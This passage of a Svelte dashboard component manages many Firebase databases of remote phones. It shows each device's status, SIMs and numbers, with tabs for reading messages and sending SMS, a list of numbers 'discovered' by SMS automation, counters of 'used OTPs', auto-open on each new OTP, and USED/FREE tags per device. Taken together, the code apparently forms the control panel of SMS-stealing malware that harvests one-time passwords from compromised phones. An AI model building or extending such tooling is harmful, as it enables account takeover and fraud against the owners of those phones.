              class="aps-tog {showNotifsTab ? 'aps-on' : ''}"
              onclick={toggleShowNotifsTab}
              aria-label="Toggle notifications tab in bottom nav"
            >
              <span class="aps-knob"></span>
            </button>
          </label>

          <label class="aps-row" style="margin-top:8px">
            <span class="aps-lbl">
              <svg
                width="13"
                height="13"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                ><path d="M15 3h6v6M9 21H3v-6M21 3l-7 7M3 21l7-7" /></svg
              >
              <span
                >{autoOpenNotif
                  ? "Auto-open Panel on new OTP (ON)"
                  : "Auto-open Panel on new OTP (OFF — Manual only)"}</span
              >
            </span>
            <button
              class="aps-tog {autoOpenNotif ? 'aps-on' : ''}"
              onclick={toggleAutoOpenNotif}
              aria-label="Toggle auto-open on new OTP"
            >
              <span class="aps-knob"></span>
            </button>
          </label>

          <!-- ── Backup & Restore ── -->
          <div class="aps-title" style="margin-top:14px">📦 Backup & Restore</div>
          <div class="bkp-section">
            <div class="bkp-desc">Export all Firebase connections, discovered numbers, and settings as a backup. Restore from a backup file after clearing cache.</div>
            <div class="bkp-btns">
              <button class="bkp-btn bkp-json" onclick={exportBackupJSON} title="Export full backup as JSON">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
                JSON
              </button>
              <button class="bkp-btn bkp-zip" onclick={exportBackupZIP} title="Export full backup as ZIP">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
                ZIP
              </button>
              <button class="bkp-btn bkp-restore" onclick={() => (showRestoreModal = true)} title="Restore from backup file">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 15v4a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
                Restore
              </button>
            </div>
          </div>
        </div>
      </div>
    {/if}

    <!-- ── Restore Modal ── -->
    {#if showRestoreModal}
      <!-- svelte-ignore a11y_no_static_element_interactions -->
      <div class="restore-overlay" onclick={closeRestoreModal} onkeydown={(e) => e.key === 'Escape' && closeRestoreModal()}>
        <!-- svelte-ignore a11y_no_static_element_interactions -->
        <div class="restore-modal" onclick={(e) => e.stopPropagation()} onkeydown={(e) => e.stopPropagation()}>
          <div class="rm-hdr">
            <span class="rm-title">📤 Restore from Backup</span>
            <button class="rm-close" onclick={closeRestoreModal} aria-label="Close">×</button>
          </div>

          <div class="rm-body">
            <!-- File upload -->
            <div class="rm-section">
              <label class="rm-label">Upload .json or .zip file</label>
              <input
                type="file"
                accept=".json,.zip"
                class="rm-file-input"
                onchange={handleRestoreFileSelect}
              />
            </div>

            <!-- OR divider -->
            <div class="rm-divider"><span>OR</span></div>

            <!-- Paste JSON -->
            <div class="rm-section">
              <label class="rm-label">Paste backup JSON</label>
              <textarea
                class="rm-paste"
                rows="5"
                placeholder='Paste your backup JSON here...'
                bind:value={restorePasteText}
              ></textarea>
              <button class="bkp-btn bkp-parse" onclick={handleRestorePaste} disabled={!restorePasteText.trim()}>
                Parse JSON
              </button>
            </div>

            <!-- Error -->
            {#if restoreError}
              <div class="rm-error">⚠ {restoreError}</div>
            {/if}

            <!-- Preview -->
            {#if restorePreview}
              <div class="rm-preview">
                <div class="rm-preview-title">Backup Preview</div>
                <div class="rm-preview-ts">Exported: {restorePreview.timestamp}</div>
                <div class="rm-preview-grid">
                  <div class="rm-stat"><span class="rm-stat-n">{restorePreview.connCount}</span><span class="rm-stat-l">Firebase DBs</span></div>
                  <div class="rm-stat"><span class="rm-stat-n">{restorePreview.phoneCount}</span><span class="rm-stat-l">Phone Numbers</span></div>
                  <div class="rm-stat"><span class="rm-stat-n">{restorePreview.discoveredCount}</span><span class="rm-stat-l">Discovered</span></div>
                  <div class="rm-stat"><span class="rm-stat-n">{restorePreview.totalRecords}</span><span class="rm-stat-l">Total Records</span></div>
                  <div class="rm-stat"><span class="rm-stat-n">{restorePreview.tomorrowCount}</span><span class="rm-stat-l">Try Tomorrow</span></div>
                  <div class="rm-stat"><span class="rm-stat-n">{restorePreview.usedOtpCount}</span><span class="rm-stat-l">Used OTPs</span></div>
                </div>
                <div class="rm-preview-conns">Connections: {restorePreview.connNames}</div>
                <div class="rm-warn">⚠ This will overwrite your current connections and discovery data. Phone numbers and OTPs are merged.</div>
                <button
                  class="bkp-btn bkp-confirm-restore"
                  onclick={executeRestore}
                  disabled={restoreProcessing}
                >
                  {#if restoreProcessing}
                    <span class="dspin"></span> Restoring…
                  {:else}
                    ✅ Confirm Restore
                  {/if}
                </button>
              </div>
            {/if}
          </div>
        </div>
      </div>
    {/if}

    <!-- Raw drawer -->
    {#if rawOpen}
      <div class="raw-drawer">
        <div class="rd-top">
          <span class="rd-lbl">Raw Firebase Request</span>
          <select bind:value={rawConnId} class="tiny-sel">
            {#each connections as c (c.id)}<option value={c.id}>{c.name}</option
              >{/each}
          </select>
          <button
            class="ico-btn"
            onclick={() => (rawOpen = false)}
            aria-label="Close"
          >
            <svg
              width="13"
              height="13"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              stroke-width="2"><path d="M18 6 6 18M6 6l12 12" /></svg
            >
          </button>
        </div>
        <div class="rd-row">
          <select bind:value={rawMethod} class="method-sel">
            {#each ["GET", "POST", "PUT", "PATCH", "DELETE"] as m}<option
                value={m}>{m}</option
              >{/each}
          </select>
          <input
            class="rd-path"
            bind:value={rawPath}
            placeholder="path/to/node"
            aria-label="Firebase path"
          />
          <button
            class="btn btn-primary btn-sm"
            onclick={sendRaw}
            disabled={rawLoading}>Send</button
          >
        </div>
        {#if ["POST", "PUT", "PATCH"].includes(rawMethod)}
          <textarea
            class="code"
            rows="3"
            bind:value={rawBody}
            style="resize:vertical;font-size:12px"
            aria-label="Request body"
          ></textarea>
        {/if}
        {#if rawRes}
          <div style="display:flex;gap:8px;align-items:center">
            <span class="s-pill {rawRes.ok ? 'sp-ok' : 'sp-err'}"
              >{rawRes.status}</span
            >
          </div>
          <pre class="json-view">{JSON.stringify(
              rawRes.data ?? rawRes,
              null,
              2,
            ).slice(0, 2000)}</pre>
        {/if}
      </div>
    {/if}

    <!-- Tab bar -->
    <div class="tab-bar">
      <button
        class="tab {activeTab === 'overview' ? 'active' : ''}"
        onclick={() => (activeTab = "overview")}>Overview</button
      >
      <button
        class="tab {activeTab === 'firebase' ? 'active' : ''}"
        onclick={() => (activeTab = "firebase")}>
        Firebase <span class="tab-cnt">{connections.length}</span></button
      >
      <button
        class="tab {activeTab === 'device' ? 'active' : ''}"
        onclick={() => switchTab("device")}
        disabled={!selectedKey}>Device</button
      >
      <button
        class="tab {activeTab === 'messages' ? 'active' : ''}"
        onclick={() => switchTab("messages")}
        disabled={!selectedKey}>Messages</button
      >
      <button
        class="tab {activeTab === 'send' ? 'active' : ''}"
        onclick={() => switchTab("send")}
        disabled={!selectedKey}>Send SMS</button
      >
      <button
        class="tab {activeTab === 'discovered' ? 'active' : ''}"
        onclick={() => { activeTab = 'discovered'; loadDiscoveryRecords(); }}
        >Discovered <span class="tab-cnt">{discoveryRecords.length}</span></button
      >
    </div>

    <!-- Tab content -->
    <div
      class="tab-body {activeTab === 'overview' ? 'tab-body-overview' : ''} {activeTab === 'firebase' ? 'tab-body-firebase' : ''}"
      bind:this={tabBodyEl}
    >
      <!-- ── FIREBASE CONNECTIONS ──────────────────────────────────── -->
      {#if activeTab === "firebase"}
        <!-- Toolbar -->
        <div class="fc-toolbar">
          <div class="fc-search-wrap">
            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
            <input class="fc-search-in" bind:value={fcSearch} placeholder="Search by name or URL…" aria-label="Search connections" />
            {#if fcSearch}<button class="fc-search-clear" onclick={() => (fcSearch = '')}>×</button>{/if}
          </div>
          <div class="fc-filter-pills">
            <button class="fc-pill {fcStatusFilter === 'all' ? 'fc-pill-a' : ''}" onclick={() => (fcStatusFilter = 'all')}>All <span class="fc-pill-cnt">{connections.length}</span></button>
            <button class="fc-pill {fcStatusFilter === 'online' ? 'fc-pill-on' : ''}" onclick={() => (fcStatusFilter = 'online')}>🟢 Online</button>
            <button class="fc-pill {fcStatusFilter === 'offline' ? 'fc-pill-off' : ''}" onclick={() => (fcStatusFilter = 'offline')}>🔴 Offline</button>
            {#if failedConns.length > 0}
              <button class="fc-pill fc-pill-fail {fcStatusFilter === 'failed' ? 'fc-pill-fail-a' : ''}" onclick={() => (fcStatusFilter = 'failed')}>
                ⚠ Failed <span class="fc-pill-cnt">{failedConns.length}</span>
              </button>
            {/if}
          </div>
          <div class="fc-global-actions">
            <!-- Master toggle -->
            {#if connections.length > 0}
              <button
                class="fc-master-toggle {masterEnabled ? 'fmt-on' : 'fmt-off'}"
                onclick={toggleAllConns}
                title="{masterEnabled ? 'Disable all connections' : 'Enable all connections'}"
              >
                <span class="fmt-knob"></span>
                <span class="fmt-label">{masterEnabled ? 'All ON' : 'All OFF'}</span>
              </button>
            {/if}
            {#if failedConns.length > 0}
              <button class="fc-act-btn fc-act-danger" onclick={removeFailedConns} title="Remove all {failedConns.length} failed connections">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14H6L5 6"/><path d="M10 11v6M14 11v6"/></svg>
                Remove Failed ({failedConns.length})
              </button>
            {/if}
            {#if connections.length > 0}
              <button class="fc-act-btn fc-act-danger" onclick={removeAllConns} title="Remove all {connections.length} connections">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14H6L5 6"/><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
                Clear All ({connections.length})
              </button>
            {/if}
            <button class="fc-act-btn" onclick={copyAllConnUrls} title="Copy all Firebase URLs">
              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
              Copy All URLs
            </button>
            <button class="fc-act-btn" onclick={copyAllConnNames} title="Copy all names">
              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/></svg>
              Copy Names
            </button>
            <button class="fc-act-btn" onclick={copyAllConnDetails} title="Copy all details (Name|URL|Path|InfoPath)">
              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>
              Copy Details
            </button>
            <button class="fc-add-glow-btn" onclick={openAddPanel} title="Add Firebase connection">
              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 5v14M5 12h14"/></svg>
              Add New
            </button>
          </div>
        </div>

        <!-- Multi-select action bar -->
        {#if fcSelected.size > 0}
          <div class="fc-sel-bar">
            <span class="fc-sel-count">{fcSelected.size} selected</span>
            <button class="fc-sel-btn" onclick={copySelectedConnUrls}>
              <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
              Copy URLs
            </button>
            <button class="fc-sel-btn fc-sel-danger" onclick={fcRemoveSelected}>
              <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14H6L5 6"/><path d="M10 11v6M14 11v6"/></svg>
              Remove Selected
            </button>
            <button class="fc-sel-btn" onclick={() => (fcSelected = new Set())}>Clear Selection</button>
          </div>
        {/if}

        <!-- Connections list -->
        {#if filteredConns.length === 0}
          <div class="fc-empty">
            {#if connections.length === 0}
              <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" opacity="0.25"><path d="M4 7l8-4 8 4v10l-8 4-8-4V7z"/><path d="M4 7l8 4 8-4M12 11v10"/></svg>
              <div class="fc-empty-title">No Firebase connections yet</div>
              <div class="fc-empty-sub">Click "Add New" or use the + button to connect a Firebase RTDB.</div>
              <button class="fc-add-glow-btn fc-add-glow-lg" onclick={openAddPanel}>
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 5v14M5 12h14"/></svg>
                Add Firebase Connection
              </button>
            {:else}
              <div class="fc-empty-title">No connections match your search</div>
              <button class="btn btn-ghost btn-sm" onclick={() => { fcSearch = ''; fcStatusFilter = 'all'; }}>Clear filters</button>
            {/if}
          </div>
        {:else}
          <!-- Select all checkbox row -->
          <div class="fc-select-all-row">
            <label class="fc-chk-label">
              <input type="checkbox" class="fc-chk" checked={fcSelected.size === filteredConns.length && filteredConns.length > 0} onchange={fcToggleAll} />
              {fcSelected.size === filteredConns.length && filteredConns.length > 0 ? 'Deselect All' : 'Select All'}
            </label>
            <span class="fc-showing">{filteredConns.length} connection{filteredConns.length !== 1 ? 's' : ''}</span>
          </div>
          <div class="fc-list">
            {#each filteredConns as conn (conn.id)}
              {@const onlineDot = conn.online > 0}
              {@const hasAuth = !!(connections.find(c => c.id === conn.id)?.token)}
              {@const realConn = connections.find(c => c.id === conn.id)}
              <div class="fc-card {fcSelected.has(conn.id) ? 'fc-card-sel' : ''}">
                <!-- Card header -->
                <div class="fc-card-hdr">
                  <input type="checkbox" class="fc-chk" checked={fcSelected.has(conn.id)} onchange={() => fcToggleSelect(conn.id)} />
                  <span class="fc-dot" style="background:{conn.color}"></span>
                  <span class="fc-name">{conn.name}</span>
                  <span class="fc-status-badge {onlineDot ? 'fc-online' : 'fc-offline'}">
                    <span class="fc-status-dot"></span>
                    {onlineDot ? `${conn.online} online` : 'Offline'}
                    {#if conn.total > 0} · {conn.total} total{/if}
                  </span>
                  {#if hasAuth}<span class="fc-auth-badge">🔐 Auth</span>{/if}
                  <div class="fc-card-actions">
                    <!-- Per-card enable/disable toggle -->
                    <button
                      class="fc-card-tog {realConn?.enabled ? 'fc-card-tog-on' : 'fc-card-tog-off'}"
                      onclick={() => toggleConn(conn.id)}
                      title="{realConn?.enabled ? 'Click to disable connection' : 'Click to enable connection'}"
                      aria-label="Toggle connection status"
                    >
                      <span class="fct-knob"></span>
                      <span class="fct-lbl">{realConn?.enabled ? 'ON' : 'OFF'}</span>
                    </button>
                    <button class="fc-copy-btn {copiedKey === `${conn.id}::url` ? 'fc-copied' : ''}" onclick={() => copyConnUrl(conn)} title="Copy URL">
                      {copiedKey === `${conn.id}::url` ? '✓' : ''}
                      <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                      {copiedKey === `${conn.id}::url` ? 'Copied!' : 'URL'}
                    </button>
                    <button class="fc-copy-btn {copiedKey === `${conn.id}::name` ? 'fc-copied' : ''}" onclick={() => copyConnName(conn)} title="Copy name">
                      {copiedKey === `${conn.id}::name` ? '✓' : ''}
                      <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/></svg>
                      {copiedKey === `${conn.id}::name` ? 'Copied!' : 'Name'}
                    </button>
                    <button class="fc-copy-btn {copiedKey === `${conn.id}::details` ? 'fc-copied' : ''}" onclick={() => copyConnDetails(conn)} title="Copy all details">
                      {copiedKey === `${conn.id}::details` ? '✓' : ''}
                      <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
                      {copiedKey === `${conn.id}::details` ? 'Copied!' : 'Details'}
                    </button>
                    <button class="fc-edit-btn" onclick={() => fcStartEdit(conn)} title="Edit connection">
                      <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>
                      Edit
                    </button>
                    <button class="fc-remove-btn" onclick={() => dropConn(conn.id)} title="Remove connection">
                      <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14H6L5 6"/><path d="M10 11v6M14 11v6"/></svg>
                    </button>
                  </div>
                </div>
                <!-- Card body: URL + paths -->
                <div class="fc-card-body">
                  <div class="fc-url-row">
                    <span class="fc-url-label">URL</span>
                    <code class="fc-url-val">{conn.url}</code>
                  </div>
                  <div class="fc-meta-row">
                    <span class="fc-meta-item"><span class="fc-meta-lbl">Messages Path:</span> <code class="fc-meta-val">{realConn?.path || 'messages'}</code></span>
                    {#if realConn?.infoPath}<span class="fc-meta-item"><span class="fc-meta-lbl">Device Info:</span> <code class="fc-meta-val">{realConn.infoPath}</code></span>{/if}
                    <span class="fc-meta-item"><span class="fc-meta-lbl">Auth:</span> <span class="fc-meta-val {hasAuth ? 'fc-auth-yes' : 'fc-auth-no'}">{hasAuth ? '🔐 Configured' : 'None'}</span></span>
                    {#if conn.error}<span class="fc-meta-item fc-error-item"><span class="fc-meta-lbl">Error:</span> {conn.error}</span>{/if}
                  </div>
                </div>
                <!-- Inline Edit form -->
                {#if fcEditId === conn.id}
                  <div class="fc-edit-form">
                    <div class="fc-edit-grid">
                      <div class="field">
                        <label for="fce-name-{conn.id}">Name</label>
                        <input id="fce-name-{conn.id}" bind:value={fcEditForm.name} placeholder="project-name" />
                      </div>
                      <div class="field">
                        <label for="fce-url-{conn.id}">Firebase URL</label>
                        <input id="fce-url-{conn.id}" bind:value={fcEditForm.url} placeholder="https://xxx-default-rtdb.firebaseio.com" />
                      </div>
                      <div class="field">
                        <label for="fce-path-{conn.id}">Messages Path</label>
                        <input id="fce-path-{conn.id}" bind:value={fcEditForm.path} placeholder="messages" />
                      </div>
                      <div class="field">
                        <label for="fce-info-{conn.id}">Device Info Path</label>
                        <input id="fce-info-{conn.id}" bind:value={fcEditForm.infoPath} placeholder="clients (optional)" />
                      </div>
                      <div class="field">
                        <label for="fce-tok-{conn.id}">Auth Token</label>
                        <input id="fce-tok-{conn.id}" type="password" bind:value={fcEditForm.token} placeholder="optional" />
                      </div>
                    </div>
                    <div class="fc-edit-foot">
                      <button class="btn btn-ghost btn-sm" onclick={fcCancelEdit}>Cancel</button>
                      <button class="btn btn-primary btn-sm" onclick={fcSaveEdit}>Save Changes</button>
                    </div>
                  </div>
                {/if}
              </div>
            {/each}
          </div>
        {/if}
      {/if}

      <!-- ── OVERVIEW ──────────────────────────────────────────────────── -->
      {#if activeTab === "overview"}
        <div class="live-card">
          <div class="lc-icon">
            <svg width="38" height="38" viewBox="0 0 32 32" fill="none">
              <rect
                x="2"
                y="4"
                width="28"
                height="20"
                rx="3"
                fill="rgba(249,115,22,0.12)"
                stroke="#f97316"
                stroke-width="1.2"
              />
              <rect
                x="5"
                y="14"
                width="5"
                height="7"
                rx="1"
                fill="#f97316"
                opacity="0.9"
              />
              <rect
                x="13"
                y="10"
                width="5"
                height="11"
                rx="1"
                fill="#38bdf8"
                opacity="0.9"
              />
              <rect
                x="21"
                y="7"
                width="5"
                height="14"
                rx="1"
                fill="#22c55e"
                opacity="0.9"
              />
            </svg>
          </div>
          <div>
            <div class="lc-title">Live Status</div>
            <div class="lc-sub">
              Total: {totalCount} &nbsp;·&nbsp; Online: {onlineCount} &nbsp;·&nbsp;
              Offline: {offlineCount}
            </div>
          </div>
        </div>

        <div class="stat-row">
          <div class="stat-card" style="border-top-color:#38bdf8">
            <div class="sc-n">{totalCount}</div>
            <div class="sc-l">TOTAL</div>
          </div>
          <div class="stat-card" style="border-top-color:#22c55e">
            <div class="sc-n" style="color:#22c55e">{onlineCount}</div>
            <div class="sc-l">ONLINE</div>
          </div>
          <div class="stat-card" style="border-top-color:#ef4444">
            <div class="sc-n" style="color:#ef4444">{offlineCount}</div>
            <div class="sc-l">OFFLINE</div>
          </div>
          <div class="stat-card" style="border-top-color:#a78bfa">
            <div class="sc-n" style="color:#a78bfa">
              {allDevices.filter((d) => d.info && getSims(d.info)).length}
            </div>
            <div class="sc-l">SIMS</div>
          </div>
        </div>

        <div class="dt-card">
          <!-- Filter chips — multi-select AND logic -->
          <div class="dt-filters">
            <div class="dt-chips">
              <div class="dt-search-wrap">
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2.5"
                  ><circle cx="11" cy="11" r="8" /><line
                    x1="21"
                    y1="21"
                    x2="16.65"
                    y2="16.65"
                  /></svg
                >
                <input
                  class="dt-search-in"
                  bind:value={tableSearch}
                  placeholder="Filter search number, ID…"
                  aria-label="Filter search devices or numbers"
                />
                {#if tableSearch}
                  <button
                    class="dt-search-clear"
                    onclick={() => (tableSearch = "")}
                    title="Clear filter search"
                    aria-label="Clear filter search">✕</button
                  >
                {/if}
              </div>
              <button
                class="dt-chip {tableActiveFilters.has('on') ? 'dco' : ''}"
                onclick={() => toggleTableFilter("on")}
                title="Online devices"
                aria-label="Filter: Online"
              >
                🟢 Online <span class="dt-chip-cnt">{onlineCount}</span>
              </button>
              <button
                class="dt-chip {tableActiveFilters.has('off') ? 'dcx' : ''}"
                onclick={() => toggleTableFilter("off")}
                title="Offline devices"
                aria-label="Filter: Offline"
              >
                🔴 Offline <span class="dt-chip-cnt">{offlineCount}</span>
              </button>
              <button
                class="dt-chip {tableActiveFilters.has('num') ? 'dcn' : ''}"
                onclick={() => toggleTableFilter("num")}
                title="Devices with phone number (online: {onlineNumCount})"
                aria-label="Filter: With number"
              >
                📱 Numbers <span class="dt-chip-cnt">{numCount}</span>
                {#if onlineNumCount > 0}<span class="dt-chip-online"
                    >🟢{onlineNumCount}</span
                  >{/if}
              </button>
              <button
                class="dt-chip {tableActiveFilters.has('used') ? 'dcu' : ''}"
                onclick={() => toggleTableFilter("used")}
                title="Used devices"
                aria-label="Filter: Used"
              >
                ✓ Used
              </button>
              {#if discoveredInTableCount > 0}
                <button
                  class="dt-chip {tableActiveFilters.has('disco') ? 'dcd' : ''}"
                  onclick={() => toggleTableFilter("disco")}
                  title="Devices with phone numbers discovered via SMS automation"
                  aria-label="Filter: Discovered"
                >
                  📡 Discovered <span class="dt-chip-cnt">{discoveredInTableCount}</span>
                </button>
              {/if}
              {#if newCount > 0}
                <button
                  class="dt-chip dcnew {tableActiveFilters.has('new')
                    ? 'dcnew-a'
                    : ''}"
                  onclick={() => toggleTableFilter("new")}
                  title="Newly added devices"
                  aria-label="Filter: New"
                >
                  ✦ New <span class="dt-chip-cnt">{newCount}</span>
                </button>
              {/if}
              {#if tableActiveFilters.size > 0 || tableSearch}
                <button
                  class="dt-chip-clear"
                  onclick={() => {
                    tableActiveFilters = new Set();
                    tableSearch = "";
                  }}
                  aria-label="Clear all filters">✕ Clear</button
                >
              {/if}
              {#if tableConnFilter}
                <button
                  class="dt-chip-clear"
                  onclick={() => (tableConnFilter = null)}
                  aria-label="Clear Firebase filter"
                >
                  ✕ {connections.find((c) => c.id === tableConnFilter)?.name ??
                    tableConnFilter}
                </button>
              {/if}
            </div>
            <!-- Firebase row -->
            <div class="dt-fb-row">
              <span class="dt-fb-lbl">Firebase:</span>
              <div class="dt-fb-badges">
                {#each connStats as c (c.id)}
                  <button
                    class="conn-badge {tableConnFilter === c.id
                      ? 'cb-active'
                      : ''}"
                    style="color:{c.color};border-color:{c.color}55;{tableConnFilter ===
                    c.id
                      ? `background:${c.color}22`
                      : ''}"
                    onclick={() =>
                      (tableConnFilter =
                        tableConnFilter === c.id ? null : c.id)}
                    title="{c.name}: {c.online}/{c.total} online"
                    aria-label="{c.name} filter"
                  >
                    <span
                      class="cb-dot"
                      style="background:{c.online > 0 ? '#22c55e' : '#334155'}"
                    ></span>
                    {c.name}
                    <span class="cb-n"
                      >{c.loading ? "…" : c.error ? "!" : c.keyCount}</span
                    >
                  </button>
                {/each}
              </div>
            </div>
          </div>

          <!-- Result count + Top pagination bar -->
          <div class="dt-count-row">
            <div class="dt-count">
              <span class="dt-cnt-val">{filteredTableDevices.length}</span>
              device{filteredTableDevices.length === 1 ? "" : "s"}
              {#if tableActiveFilters.size > 0 || tableConnFilter || tableSearch}
                · <span class="dt-filter-tag">
                  {[...tableActiveFilters].join(" + ")}
                  {tableConnFilter
                    ? " @" +
                      connections.find((c) => c.id === tableConnFilter)?.name
                    : ""}
                  {tableSearch ? ` 🔍 "${tableSearch}"` : ""}
                </span>
              {/if}
            </div>
            <div
              class="pag-compact"
              aria-label="Device pagination top controls"
            >
              <button
                class="pag-btn-sm"
                disabled={devicePage === 0}
                onclick={() => setDevicePage(devicePage - 1)}
                aria-label="Previous page"
                title="Previous page">‹ Prev</button
              >
              <span class="pag-pill" title="Current page of total pages"
                >Page <strong>{devicePage + 1}</strong> of
                <strong>{totalDevicePages}</strong></span
              >
              <button
                class="pag-btn-sm"
                disabled={devicePage >= totalDevicePages - 1}
                onclick={() => setDevicePage(devicePage + 1)}
                aria-label="Next page"
                title="Next page">Next ›</button
              >
            </div>
          </div>

          <!-- Device list — paginated, 20/page with vertical scroll -->
          <div class="dt-scroll" bind:this={dtScrollEl}>
            <div class="dev-card-grid">
              {#each filteredTableDevices.slice(devicePage * DEVICES_PER_PAGE, (devicePage + 1) * DEVICES_PER_PAGE) as d (d.connId + "::" + d.key)}
                {@const on = d.info ? isOnline(d.info) : null}
                {@const bat = d.info ? getBattery(d.info) : null}
                {@const fp = getDisplayPhone(d.connId, d.key, d.info)}
                {@const sc = d.info ? getSims(d.info) : null}
                {@const isNew = newDeviceKeys.has(`${d.connId}::${d.key}`)}
                {@const devUsed = isUsed(`dev::${d.connId}::${d.key}`)}
                {@const lastMsgTs = Number(d.info?.lastMessageTime ?? 0)}
                {@const lastMsgFmt = lastMsgTs ? (() => {
                  const diff = Date.now() - lastMsgTs;
                  if (diff < 60000) return `${Math.floor(diff/1000)}s ago`;
                  if (diff < 3600000) return `${Math.floor(diff/60000)}m ago`;
                  if (diff < 86400000) return `${Math.floor(diff/3600000)}h ago`;
                  const d2 = new Date(lastMsgTs);
                  return `${d2.getDate()}/${d2.getMonth()+1} ${String(d2.getHours()).padStart(2,'0')}:${String(d2.getMinutes()).padStart(2,'0')}`;
                })() : null}
                <div
                  class="dev-card {selectedKey === d.key &&
                  selectedConnId === d.connId
                    ? 'dev-card-sel'
                    : ''} {devUsed ? 'dev-card-used' : ''} {isCopied(d.connId, d.key) ? 'dev-card-copied' : ''}"
                  onclick={() => selectDevice(d.connId, d.key)}
                  role="button"
                  tabindex="0"
                  onkeydown={(e) =>
                    e.key === "Enter" && selectDevice(d.connId, d.key)}
                  aria-label="Select device {d.key}"
                >
                  <!-- Left accent bar (Firebase color) -->
                  <span class="dev-card-bar" style="background:{d.conn.color}"
                  ></span>
                  <!-- Status dot -->
                  <span
                    class="td-dot {on === true
                      ? 'ton'
                      : on === false
                        ? 'toff'
                        : 'tunk'} dev-card-dot"
                  ></span>
                  <!-- Main content -->
                  <div class="dev-card-body">
                    <!-- Device ID row -->
                    <div class="dev-card-id-row">
                      <span class="mono dev-card-id"
                        >{d.key.slice(0, 16)}{d.key.length > 16
                          ? "…"
                          : ""}</span
                      >
                      {#if isNew}<span class="td-new">NEW</span>{/if}
                      <!-- Used checkbox -->
                      <button
                        class="dev-card-used-chk {devUsed ? 'dcuc-checked' : 'dcuc-unchecked'}"
                        title="{devUsed ? 'Mark as not used' : 'Mark as used'}"
                        aria-label="{devUsed ? 'Unmark used' : 'Mark used'}"
                        aria-pressed={devUsed}
                        onclick={(e) => {
                          e.stopPropagation();
                          toggleUsed(`dev::${d.connId}::${d.key}`);
                        }}
                      >
                        {#if devUsed}
                          <svg width="10" height="10" viewBox="0 0 12 12" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polyline points="1.5 6 4.5 9 10.5 2.5"/></svg>
                          USED
                        {:else}
                          <svg width="10" height="10" viewBox="0 0 12 12" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="1" y="1" width="10" height="10" rx="2"/></svg>
                          FREE
                        {/if}
                      </button>
                      <button
                        class="icon-btn-xs"
                        title="Copy device ID"
